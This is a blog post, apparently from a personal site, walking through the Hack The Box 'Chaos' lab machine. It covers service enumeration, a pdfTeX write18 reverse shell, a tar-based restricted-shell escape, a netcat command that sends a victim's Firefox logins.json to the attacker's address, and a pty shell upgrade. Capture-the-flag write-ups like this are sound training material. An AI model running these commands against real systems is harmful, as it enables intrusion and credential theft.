@@ -1,0 +1,181 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Hack The Box | sawicky&#39;s space</title>
+  <meta name="author" content="David Sawick">
+
+  
+  <meta name="description" content="Hack the Box - Chaospwned: 20/02/2019Today i pwned the Chaos box on Hack The Box - It was my first one, and I probably made a mistake as this one is a">
+  
+  
+
+  <link rel="alternate" href="/atom.xml" title="sawicky&#39;s space" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
+  
+</head></html>
+
+<body>
+  <header id="header" class="inner"><nav>
+  <ul>
+    
+      <li><a href="/">home</a></li>
+    
+      <li><a href="/archives">archive</a></li>
+    
+      <li><a href="/ctf">ctf</a></li>
+    
+      <li><a href="/pwn">pwn</a></li>
+    
+      <li><a href="/about">about</a></li>
+    
+      <li><a href="/portfolio">portfolio</a></li>
+    
+  </ul>
+</nav></header>
+  <div id="content" class="inner"><article class="page">
+  
+  <header>
+    
+  
+    <h1 class="title">Hack The Box</h1>
+  
+
+    
+  </header>
+  <div class="entry-content">
+    
+      <h2 id="Hack-the-Box-Chaos"><a href="#Hack-the-Box-Chaos" class="headerlink" title="Hack the Box - Chaos"></a>Hack the Box - Chaos</h2><h5 id="pwned-20-02-2019"><a href="#pwned-20-02-2019" class="headerlink" title="pwned: 20/02/2019"></a>pwned: 20/02/2019</h5><p>Today i pwned the Chaos box on Hack The Box - It was my first one, and I probably made a mistake as this one is a little crazy.</p>
+<p>I will go through my enumeration process at each stage, output of good checkpoint commands and the method I used to root the machine.</p>
+<p><strong>You can view full size images by clicking the text below the image</strong></p>
+<h3 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration."></a>Initial Enumeration.</h3><p>Very similar to most machines - a detailed nmap scan to see services using the following command:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -p 1-65535 -A -v 10.10.10.120</span><br></pre></td></tr></table></figure></p>
+<p>This produced the following output:<br><a href="/media/images/pwn/huge-chaosnmap.png"><img src="/media/images/pwn/body-chaosnmap.png" alt="Nmap scan for 10.10.10.120" title="Chaos"></a></p>
+<p>We see a few interesting ports here that can tell us information:</p>
+<ul>
+<li>80: There is a web server, and we can try accessing it in a browser.</li>
+<li>110: A pop3 mailserver running Dovecot</li>
+<li>143: An imap mailserver running Dovecot</li>
+<li>993: A ssl connection to the imap mailserver</li>
+<li>995: A ssl connection to the pop3 mailserver</li>
+<li>1000: Webmin server, can also be accessed via the browser.</li>
+</ul>
+<p>First things first, let’s try accessing it from the browser.</p>
+<a href="/media/images/pwn/huge-chaosdirectip.png"><img src="/media/images/pwn/body-chaosdirectip.png" alt="What we see when entering the web server for the first time" title="Chaos"></a>
+<p>Okay, so we can’t access this website via the ip address. So how else do we access websites?<br>By using a qualified name. How do we bind an ip address to a qualified domain name?<br>I edited the /etc/hosts file to point 10.10.10.120 to chaos.htb, and this is what I saw:</p>
+<a href="/media/images/pwn/huge-chaosqn.png"><img src="/media/images/pwn/body-chaosqn.png" alt="Expand Image" title="Chaos"></a>
+<p>So far so good, but after poking around this website and the source, I couldn’t really find anything interesting. Time to fire up dirb using:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.120/ /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure></p>
+<a href="/media/images/pwn/huge-chaosdirb.png"><img src="/media/images/pwn/body-chaosdirb.png" alt="Expand Image" title="Chaos"></a>
+<h2 id="The-WordPress-Rabbit-Hole"><a href="#The-WordPress-Rabbit-Hole" class="headerlink" title="The WordPress Rabbit Hole"></a>The WordPress Rabbit Hole</h2><p>After running dirb, I found that the website contained a wordpress site. I fired up wpscan to find directories, and enumerate possible usernames and passwords</p>
+<a href="/media/images/pwn/huge-chaoswpscan.png"><img src="/media/images/pwn/body-chaoswpscan.png" alt="Expand Image" title="Chaos"></a>
+<p>The dirb revealed a wordpress site, with a single author - Human</p>
+<p>This brought me to a wordpress site with a password protected post. I ignored this for now, and tried for atleast 2 hours to try and brute force or break my way into the WordPress admin control panel, as I usually do, as I was positive this was the answer. This is why I called this the rabbit hole, as it was ultimately a dead end.</p>
+<p>I then turned my attention to the password protected post. After looking at the forum thread on HTB, one user said that zero brute force was required. This means that the password was something logical<br>Heres what I tried</p>
+<ul>
+<li>Viewed source for hints - No results</li>
+<li>Viewed BurpSuite repeater output for hints - No results<br>I noticed one thing missing that I usually see on WP posts - The author. As a hail mary I entered the author’s name as the password:</li>
+</ul>
+<a href="/media/images/pwn/huge-wp1.png"><img src="/media/images/pwn/body-wp1.png" alt="Expand Image" title="Chaos"></a>
+<p>I now had the credentials for webmail - I immediately assumed this meant the pop3/imap webmail servers, so I had to study on how to talk with these servers. Turns out you can just telnet into these servers, and use some Dovecot formatted commands to login as a user.</p>
+<p>I tried to login as ayush to the dovecot pop3 server using telnet, however it told me that Authentication would not be allowed using plaintext. I thought for a moment, and realized it was obvious - I was using telnet, which transmits in plain text.</p>
+<p>I then did some more research on SSL clients that can connect to a port, and came across s_client from openssl. I used s_client to connect to the ssl port of pop3 this time (995) using:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect 10.10.10.120:995</span><br></pre></td></tr></table></figure></p>
+<a href="/media/images/pwn/huge-chaos4.png"><img src="/media/images/pwn/body-chaos4.png" alt="Expand Image" title="Chaos"></a>
+<p>I finally logged in with some Dovecot commands, but it took me quite a while to get the hang out of the commands:</p>
+<a href="/media/images/pwn/huge-chaos5.png"><img src="/media/images/pwn/body-chaos5.png" alt="Expand Image" title="Chaos"></a>
+<p>Eventually - I stumbled across an email in the Drafts folder and fetched it from the s_client session using:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a fetch 1 body[text]</span><br></pre></td></tr></table></figure></p>
+<a href="/media/images/pwn/huge-chaos6.png"><img src="/media/images/pwn/body-chaos6.png" alt="Expand Image" title="Chaos"></a>
+<p>So this email had 2 attachments - A text file named enim_msg.txt, which was encoded in base64 thanks to the Content-Transfer-Encoding: base64 header, and a python file called en.py</p>
+<p>I decoded the enim_msg.txt from b64, and it ended up being encrypted. Which was expected as the email said it was encrypted.</p>
+<p>I then decoded the en.py file and opened it in my IDE:</p>
+<a href="/media/images/pwn/huge-chaos7.png"><img src="/media/images/pwn/body-chaos7.png" alt="Expand Image" title="Chaos"></a>
+<p>This seemed to be just an encryption function. I assumed that I needed to develop the decrypt function. While I do know programming in python, i only have very little experience in the PyCrypto library (which was what was being used here), especially padding byte strings for use in Cipher Block Chain (cbc) mode. So I did some research:</p>
+<a href="/media/images/pwn/huge-chaos8.png"><img src="/media/images/pwn/body-chaos8.png" alt="Expand Image" title="Chaos"></a>
+<a href="/media/images/pwn/huge-chaos9.png"><img src="/media/images/pwn/body-chaos9.png" alt="Expand Image" title="Chaos"></a>
+<p>After a decent chunk of time, I decided to google a snippet of the encryption function in case it was used elsewhere. Lo and behold, the exact same encryption function was a popular github repo, and it included the exact decryption function that I also needed. I also hate to mention that I was stuck after this step anyway because I included the text that starts with –= into my to-be-decrypted file, which I realized was just a signature/EOF delimeter. Rip 30 mins to that.</p>
+<a href="/media/images/pwn/huge-chaos10.png"><img src="/media/images/pwn/body-chaos10.png" alt="Expand Image" title="Chaos"></a>
+<p>Now, reading back the email, Ayush said “YOU are the password”. I figured out pretty quickly that the password was probably ‘sahay’ then. I then used that as the key to decode the msg file:</p>
+<a href="/media/images/pwn/huge-chaos12.png"><img src="/media/images/pwn/body-chaos12.png" alt="Expand Image" title="Chaos"></a>
+<p>As expected, this message was b64 encoded again. A quick decode using:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -d decrypted_msg_d &gt; decrypted_msg_final</span><br></pre></td></tr></table></figure></p>
+<p>Led to this result:</p>
+<a href="/media/images/pwn/huge-chaos13.png"><img src="/media/images/pwn/body-chaos13.png" alt="Expand Image" title="Chaos"></a>
+<p>So, now we have a new link in that website that could not possibly be dirbusted. After navigating it and inspecting it in BurpSuite, we can see that it is an app called pdfTeX, which is a php app that can convert LaTeX to PDF.</p>
+<a href="/media/images/pwn/huge-chaos14.png"><img src="/media/images/pwn/body-chaos14.png" alt="Expand Image" title="Chaos"></a>
+<p>This led me to googling exploits or vulnerabilities, and it turns out, Pdftex actually executes commands in the host environment in order to convert the file, and direct commands can be written with the \immediate\write18{} tex line. As we can see from the output above, write18 was enabled - This was a clear vector for a reverse shell.</p>
+<p>There were a few things I tried - First, I tried entering a direct nc shell to myself:</p>
+<a href="/media/images/pwn/huge-chaos16.png"><img src="/media/images/pwn/body-chaos16.png" alt="Expand Image" title="Chaos"></a>
+<p>This didn’t work, as I assume that the host did not have nc installed.</p>
+<p>Next, I tried to run a php reverse shell that I got from a reverse shell cheat sheet. I also had to encode the entire command using a URL encoding service online, and this worked, but closed the connection straight after:</p>
+<a href="/media/images/pwn/huge-chaos18.png"><img src="/media/images/pwn/body-chaos18.png" alt="Expand Image" title="Chaos"></a>
+<p>I tried running this a few more times, but nothing worked. Eventually, I tried the python reverse shell one liner out. I encoded this too<br><a href="/media/images/pwn/huge-chaos18-5.png"><img src="/media/images/pwn/body-chaos18-5.png" alt="Expand Image" title="Chaos"></a></p>
+<p>And finally, after some trial and error, I had a reverse shell for the www-data user:</p>
+<a href="/media/images/pwn/huge-chaos19.png"><img src="/media/images/pwn/body-chaos19.png" alt="Expand Image" title="Chaos"></a>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><p>Now I feel like that the machine has moved away from CTF like challenges, and was now doing some priviledge escalation.<br>I managed to get a user shell quite quickly, as my first step of enumeration for a low-priv shell is to read /etc/passwd.<br>This revealed a list of users (and hopefully a password). Ayush was on that list, who was a user I already had a password for if he was lazy.<br>So I tried logging in as him with the same credentials, and it worked:</p>
+<a href="/media/images/pwn/huge-chaos20.png"><img src="/media/images/pwn/body-chaos20.png" alt="Expand Image" title="Chaos"></a>
+<p>But there was a problem, I was in a restricted bash (rbash) shell, and the only command available to me seemingly was cd.<br>I then studied a completely new topic of escaping a restricted shell, and found this incredible document from Exploit DB that listed a few techniques:<br><a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</a></p>
+<p>This had all the information I needed, so I tried one by one each command to see if I had access to it, and noticed that I could use the tar command. So, I followed that pdf and typed in:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh</span><br></pre></td></tr></table></figure></p>
+<a href="/media/images/pwn/huge-chaos21.png"><img src="/media/images/pwn/body-chaos21.png" alt="Expand Image" title="Chaos"></a>
+<p>I couldn’t believe it actually worked, I now had a non restricted shell. But for whatever reason, I still could not use commands like ls. I tried to run them directly from their directories using the following workaround<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /bin/ls -la</span><br></pre></td></tr></table></figure></p>
+<p>Which worked. So then I navigated to my home directory, and found the user flag.</p>
+<a href="/media/images/pwn/huge-chaos22.png"><img src="/media/images/pwn/body-chaos22.png" alt="Expand Image" title="Chaos"></a>
+<p>Next, I had a look around the users home directory showing all files using the above command again:</p>
+<a href="/media/images/pwn/huge-chaos23.png"><img src="/media/images/pwn/body-chaos23.png" alt="Expand Image" title="Chaos"></a>
+<p>I had to get some help here with some hints, as the hints suggested that the root flag is within the same directory as the user flag. So I knew it had to be in here somewhere. I found a .mozilla folder, and wondered if there was possibly some saved logins stored, as I knew that Mozilla stored passwords in an sqlite database.</p>
+<p>Sure enough, I found a mozilla profile, and the logins.json and key4.db file that I needed:</p>
+<a href="/media/images/pwn/huge-chaos24.png"><img src="/media/images/pwn/body-chaos24.png" alt="Expand Image" title="Chaos"></a>
+<p>I had to google on how to restore Mozilla profiles and carry them across computers, as I had no experience doing so. In my research, I found out that you only need the logins.json and key4.db file, and then just copy them to another profile or your profile and thats all you need to do.</p>
+<p>I tried to cat each file, and then copy and paste it’s contents into a file using echo, but that didn’t work.<br>I then did some more research on how I can transfer files via a reverse shell, and found a way using netcat, you setup a listener on attacker to pipe to a file, and setup a connection on the host that reads the file. I used the following commands:</p>
+<p>Client:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 5556 &gt; logins.json</span><br></pre></td></tr></table></figure></p>
+<p>Host:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/nc -w 3 10.10.12.163 5556 &lt; logins.json</span><br></pre></td></tr></table></figure></p>
+<p>And then the same for the key4db file. This worked:</p>
+<a href="/media/images/pwn/huge-chaos25.png"><img src="/media/images/pwn/body-chaos25.png" alt="Expand Image" title="Chaos"></a>
+<p>I then transferred across those 2 files, overwriting my current firefox (it was just the burpsuite firefox so there was nothing saved) profiles, and checked my saved logins.</p>
+<p>Sure enough:</p>
+<a href="/media/images/pwn/huge-chaos26.png"><img src="/media/images/pwn/body-chaos26.png" alt="Expand Image" title="Chaos"></a>
+<p>The details were there in plain text. I then went back to my www-data reverse shell, tried to sign in as root, but I couldn’t sign in without an interactive TTY. So i googled Shell upgrades, and found a python one liner:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br></pre></td></tr></table></figure></p>
+<p>This worked great, then I just logged in to root as normal with su, put in my new password, and found the flag</p>
+<a href="/media/images/pwn/huge-chaos27-rooted.png"><img src="/media/images/pwn/body-chaos27-rooted.png" alt="Expand Image" title="Chaos"></a>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>All in all, an absolutely crazy box for my skill level (which is near 0 at the moment), but I learned an astronomical amount regarding new enumeration techniques, escaping restricted shells, enumeration for priv esc as well as learning how to avoid traps.</p>
+
+    
+    
+  </div>
+  
+</article></div>
+  <footer id="footer" class="inner"><div class="social alignright">
+  
+  
+  
+  
+  <a class="rss" href="/atom.xml" title="RSS">RSS</a>
+</div>
+<p>
+  
+  &copy; 2019 David Sawick
+  
+</p>
+<div class="clearfix"></div></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id="phasebeam">
+  <canvas></canvas>
+  <canvas></canvas>
+  <canvas></canvas>
+</div>
+<script src="/js/phasebeam.js"></script>
+</body>
+</html>
